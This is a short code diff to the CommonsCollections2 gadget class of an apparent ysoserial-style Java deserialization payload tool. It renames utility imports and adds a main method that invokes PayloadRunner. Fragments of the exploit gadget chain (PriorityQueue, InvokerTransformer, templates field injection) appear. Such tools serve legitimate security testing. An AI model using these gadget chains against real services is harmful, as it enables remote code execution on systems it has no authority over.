@@ -3,14 +3,15 @@ package A.R.ysogate.payloads.gadgets;
 import java.util.PriorityQueue;
 import java.util.Queue;
 
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import org.apache.commons.collections4.comparators.TransformingComparator;
 import org.apache.commons.collections4.functors.InvokerTransformer;
 
 import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Authors;
 import A.R.ysogate.payloads.annotation.Dependencies;
-import A.R.ysogate.payloads.util.Gadgets;
-import A.R.ysogate.payloads.util.Reflections;
+import A.R.ysogate.payloads.utils.Gadgets;
+import A.R.ysogate.payloads.utils.Reflections;
 
 
 /*
@@ -40,5 +41,9 @@ public class CommonsCollections2 implements ObjectPayload<Queue<Object>> {
 		Reflections.setFieldValue(queue, "queue", new Object[]{templates, templates});
 
 		return queue;
+	}
+
+	public static void main(final String[] args) throws Exception {
+		PayloadRunner.run(CommonsCollections2.class, args);
 	}
 }
